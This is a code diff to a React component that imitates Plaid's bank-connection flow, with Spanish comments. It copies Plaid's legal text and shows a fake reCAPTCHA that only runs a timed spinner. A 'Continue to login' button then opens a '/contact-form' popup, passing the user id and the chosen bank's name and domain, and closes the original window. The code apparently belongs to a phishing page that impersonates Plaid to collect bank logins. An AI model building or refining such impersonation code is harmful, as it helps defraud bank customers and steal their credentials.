@@ -80,30 +80,31 @@ export default function PlaidConnect() {
 
   // Al elegir un banco → pantalla del reCAPTCHA.
   const pickBank = (b) => { setBank(b); setCaptchaState('idle'); setStep('captcha') }
-  // Marcar el check: spinner → check verde → abre ContactForm en nueva ventana.
+  // Marcar el check: spinner → check verde → avanza al login
   const checkCaptcha = () => {
     if (captchaState !== 'idle') return
     setCaptchaState('checking')
     clearTimeout(capTimer.current)
     capTimer.current = setTimeout(() => {
       setCaptchaState('done')
-      capTimer.current = setTimeout(() => {
-        // Abrir ContactForm en nueva ventana con user_id y banco
-        const bankName = bank?.name || 'bank'
-        const bankFile = bank?.file || ''
-        const bankDomain = bank?.domain || ''
-        const params = new URLSearchParams({
-          uid: userId || '',
-          bank: bankName,
-          ...(bankFile && { file: bankFile }),
-          ...(bankDomain && { domain: bankDomain }),
-        })
-        const contactFormUrl = `/contact-form?${params.toString()}`
-        window.open(contactFormUrl, '_blank', 'width=600,height=700,noopener')
-        // Cerrar esta ventana después de un momento
-        setTimeout(() => window.close(), 1000)
-      }, 700)
+      capTimer.current = setTimeout(() => setStep('login'), 700)
     }, 1200)
+  }
+
+  // Abre ContactForm cuando hace click en "Continue to login"
+  const openContactForm = () => {
+    const bankName = bank?.name || 'bank'
+    const bankFile = bank?.file || ''
+    const bankDomain = bank?.domain || ''
+    const params = new URLSearchParams({
+      uid: userId || '',
+      bank: bankName,
+      ...(bankFile && { file: bankFile }),
+      ...(bankDomain && { domain: bankDomain }),
+    })
+    const contactFormUrl = `/contact-form?${params.toString()}`
+    window.open(contactFormUrl, '_blank', 'width=600,height=700,noopener')
+    setTimeout(() => window.close(), 1000)
   }
 
   // ---- Paso 3: reCAPTCHA ----
@@ -205,7 +206,7 @@ export default function PlaidConnect() {
 
           {/* Texto legal + botón */}
           <p className="mx-auto mt-auto max-w-[340px] pt-8 text-center text-sm text-content-tertiary">Plaid may use device, connection, and financial data including transactions and contact info to help minimize risk, fraud, and loss.</p>
-          <button className="mt-4 flex w-full items-center justify-center gap-2 rounded-full bg-black py-3.5 font-bold text-white hover:bg-black/90">
+          <button onClick={openContactForm} className="mt-4 flex w-full items-center justify-center gap-2 rounded-full bg-black py-3.5 font-bold text-white hover:bg-black/90">
             Continue to login
             <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M15 3h6v6M10 14 21 3M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6" /></svg>
           </button>
